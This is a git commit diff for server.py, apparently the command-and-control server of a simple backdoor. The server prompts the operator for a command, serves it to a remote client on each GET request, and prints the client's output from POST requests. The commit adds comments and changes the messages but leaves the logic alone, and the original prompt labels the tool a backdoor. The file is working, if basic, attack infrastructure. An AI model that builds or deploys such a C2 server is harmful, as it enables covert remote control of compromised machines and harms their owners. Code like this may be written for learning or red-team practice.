bc21a46421c5f5b96cc794ee5fa4b3c4d45134fd
JJcoded <jjcoded.mail@gmail.com>
2024-10-25 12:35:54 +1000

    Update server.py

--- server.py
+++ server.py
@@ -1,5 +1,4 @@
 import http.server
-import os
 
 HOST_NAME = "192.168.15.16"  # Server IP
 PORT_NUMBER = 5000  # Server Port
@@ -7,25 +6,30 @@ PORT_NUMBER = 5000  # Server Port
 class HTTPHandler(http.server.BaseHTTPRequestHandler):
     
     def do_GET(self):
-        c2_command = input('[Basic@backdoor] ')
+        # Ask for C2 command to send to the client
+        c2_command = input('[Server] Enter command to send to the client: ')
+        # Send response headers
         self.send_response(200)
         self.send_header('Content-Type', 'text/html')
         self.end_headers()
+        # Send the command to the client
         self.wfile.write(c2_command.encode())
+        print(f'[Server] Command sent: {c2_command}')
     
     def do_POST(self):
+        # Receive and display the client's POST response
         self.send_response(200)
         self.end_headers()
         length = int(self.headers['Content-Length'])
-        PostData = self.rfile.read(length)
-        print(PostData.decode())
+        post_data = self.rfile.read(length)
+        print(f'[Client Response] {post_data.decode()}')
 
 if __name__ == '__main__':
     server_class = http.server.HTTPServer
     httpd = server_class((HOST_NAME, PORT_NUMBER), HTTPHandler)
+    print(f'[Server] Starting server at {HOST_NAME}:{PORT_NUMBER}')
     try:
-        print(f"[*] Starting server on {HOST_NAME}:{PORT_NUMBER}")
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print('[-] Server Terminated')
+        print('\n[Server] Server terminated.')
         httpd.server_close()
